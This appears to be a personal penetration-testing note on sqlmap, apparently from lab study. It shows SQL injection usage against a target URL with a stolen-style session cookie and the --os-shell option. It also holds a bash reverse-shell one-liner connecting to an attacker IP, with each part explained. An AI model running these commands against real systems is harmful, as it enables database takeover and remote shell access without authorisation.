---
id: sqlmap
aliases: []
tags:
  - Webapp/Tools/sqlmap
links: "[[Webapp/Enumeration/Tools|Tools]]"
---

# sqlmap

[sqlmap](https://github.com/sqlmapproject/sqlmap) —
Automatic SQL injection and database takeover tool

___

<!-- Usage {{{-->
## Usage

```sh
sqlmap -u 'http://<target>/dashboard.php?search=<search_query>' --cookie="<cookie_value>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sqlmap -u 'http://10.129.206.33/dashboard.php?search=test' --cookie="PHPSESSID=fctb2tijni53779gaeq0u5eq8i"
> ```
> > [!info]
> >
> > - `u`: Target URL
> > - `--cookie`: HTTP header cookie value
<!-- }}} -->

> [!tip]
>
> To exploit the vulnerability, `sqlmap` should be called again
> with the `--os-shell` option to conclude in a shell

<!-- Tip {{{-->
> [!tip]
>
> From the initial shell, the following Bash one-liner
> will initiate a connection from target back to the attacker machine
>
> ```sh
> bash -c "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"
> ```
>
> > [!info]-
> >
> > - `bash`: Invoke a Bash shell
> > - `-c`: Execute the command that follows
> > - `bash -i`: Invoke another Bash shell instance
> > - `>&`: Redirect `stdout` and `stderr` to the specified location
> > - `/dev/tcp/<attacker_ip>/<port>`: Initiate a TCP connection to the specified address
> > - `0>&1`: Redirect `stdin` to `stdout`
<!-- }}} -->

___
<!-- }}} -->
